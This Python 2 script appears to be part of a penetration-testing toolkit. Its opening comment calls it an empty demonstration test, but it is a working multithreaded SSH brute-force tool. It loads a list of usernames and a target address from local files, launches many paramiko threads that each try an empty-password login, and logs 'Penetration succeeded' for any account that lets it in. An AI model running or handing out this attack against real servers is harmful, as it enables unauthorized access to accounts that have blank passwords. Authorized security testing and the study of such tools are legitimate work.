# This is an empty test for demonstration of the application work flow
import paramiko
import socket
import pickle
import threading
import sys
import datetime
import csv
import time

lock = threading.Lock()
attempts = 0


class SSHForce(threading.Thread):
    def __init__(self, _ip, _port, _hostname, _username):
        threading.Thread.__init__(self)
        paramiko.util.log_to_file("Groups//BruteForce//paramiko.log")
        self.IP = _ip
        self.PORT = _port
        self.hostname = _hostname
        self.username = _username
        # assign a name to the thread for better debug
        name = ("Thread %s" % attempts)
        threading.current_thread().setName(name)
        self.id = threading.current_thread().getName()

        self.ret = [0, 0]

    def guess_ssh_user(self):
        try:
            client = paramiko.SSHClient()
            client.load_system_host_keys()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(hostname=self.IP, username=self.username, password="")
            lock.acquire()
            print ("Login - user name is  ==> %s" % self.username)
            lock.release()
            client.close()
            self.ret = ['Success', self.username]
        except socket.error as e:
            lock.acquire()
            print ("Error on Thread: %s" % self.id)
            print "Socket Error"
            print e
            print ("\n")
            lock.release()
        except paramiko.AuthenticationException as e:
            lock.acquire()
            print ("Failed to Login - user name is not ==> %s" % self.username)
            print e
            lock.release()
        except paramiko.SSHException as e:
            lock.acquire()
            print ("Error on Thread: %s User name: %s" % (self.id, self.username)), '\n', e
            lock.release()
            time.sleep(3)
            del client
            self.guess_ssh_user()

    def join(self, timeout=None):
        threading.Thread.join(self)
        return self.ret

    def run(self):
        self.guess_ssh_user()


def collect_param():
    # param_file = open('../parameters', 'rb')   # for debug purposes
    param_file = open('Groups//parameters', 'rb')
    param_list = pickle.load(param_file)
    param_file.close()
    return param_list


def parse_param(param_list):
    parsed_param = {}
    for item in param_list:
        parsed_param[item[0]] = item[1]
    return parsed_param

"""
def thread_routine(_parsed_parameters_main, _username):
    cannon = SSHForce(_ip=_parsed_parameters_main['_IP'],
                      _port=_parsed_parameters_main['_Port'],
                      _hostname=_parsed_parameters_main['_Hostname'],
                      _username=_username)
    return cannon.guess_ssh_user()
"""


def read_csv():
    filename = 'Groups//BruteForce//usernames.csv'
    f = open(filename, 'rb')
    reader = csv.reader(f)
    try:
        user_list = []
        for row in reader:
            user_list.extend(row)
    except csv.Error as e:
        sys.exit('file %s, line %d: %s' % (filename, reader.line_num, e))
    return user_list


if __name__ == "__main__":

    # initiating variable and log files
    data_log = open("Groups//BruteForce//data_log", 'w')
    temp_stdout = sys.stdout
    sys.stdout = data_log
    success = False
    UserList = read_csv()

    print "BruteForceGroup"
    print ("Test run on: %s" % datetime.datetime.utcnow())

    parameters = collect_param()
    parsed_parameters_main = parse_param(parameters)
    print "Parsed Successfully"

    # UserList = ['root','hi','sis']

    # creating threads
    th = ['']*len(UserList)
    # th = ['']*500
    for i in range(0, len(UserList)):
        # th[i] = threading.Thread(target=thread_routine, args=(parsed_parameters_main, UserList[i]))
        th[i] = SSHForce(_ip=parsed_parameters_main['_IP'],
                      _port=parsed_parameters_main['_Port'],
                      _hostname=parsed_parameters_main['_Hostname'],
                      _username=UserList[i])
        th[i].start()
        attempts += 1
        if threading.active_count() > 99:
            time.sleep(10)
        time.sleep(0.1)

    # join threads
    for t in th:
        return_value = t.join()
        if return_value[0] is "Success":
            success = True
            print ("Penetration succeeded, user name is: %s" % return_value[1])
        else:
            pass

    # printing test results
    print ("Tried %s user names" % attempts)

    # closing files and etc
    sys.stdout = temp_stdout
    data_log.close()
